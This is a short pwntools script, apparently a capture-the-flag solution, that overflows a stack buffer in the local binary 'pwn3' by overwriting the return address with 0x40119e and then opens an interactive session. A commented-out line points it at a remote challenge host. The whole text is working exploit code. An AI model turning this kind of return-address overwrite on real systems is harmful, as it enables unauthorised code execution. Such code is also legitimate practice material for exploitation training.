from pwn import *

p = process('./pwn3')
#p = remote('shadowchat.top', 8302)
#context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(p)
payload = b'a' * (0x20 + 8) + p64(0x40119e)
p.send(payload)

p.interactive()
